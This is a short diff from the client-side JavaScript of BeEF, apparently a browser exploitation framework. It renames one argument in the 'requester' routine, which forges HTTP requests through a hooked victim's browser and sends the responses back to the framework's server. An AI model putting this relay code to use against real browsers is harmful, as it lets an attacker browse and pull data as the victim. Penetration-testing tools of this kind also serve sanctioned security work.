@@ -25,7 +25,7 @@ beef.net.requester = {
             request = requests_array[i];
             if (request.proto == 'https') var scheme = 'https'; else var scheme = 'http';
             beef.debug('[Requester] ' + request.method + ' ' + scheme + '://' + request.host + ':' + request.port + request.uri + ' - Data: ' + request.data);
-            beef.net.forge_request(scheme, request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossDomain, request.id,
+            beef.net.forge_request(scheme, request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossOrigin, request.id,
                                        function(res, requestid) { beef.net.send('/requester', requestid, {
                                            response_data: res.response_body,
                                            response_status_code: res.status_code,
